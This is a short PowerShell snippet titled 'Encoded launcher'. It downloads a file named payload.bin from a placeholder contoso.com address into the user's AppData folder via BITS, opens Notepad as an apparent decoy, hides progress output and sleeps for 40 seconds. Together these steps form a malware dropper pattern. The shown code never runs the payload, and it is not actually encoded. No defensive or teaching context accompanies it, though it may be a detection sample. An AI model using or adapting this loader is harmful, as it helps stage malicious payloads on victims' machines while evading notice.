# Encoded launcher
Start-BitsTransfer -Source "https://contoso.com/payload.bin" -Destination "$env:APPDATA\payload.bin"
Start-Process -FilePath 'notepad.exe'
$ProgressPreference = "SilentlyContinue"
Start-Sleep -Seconds 40
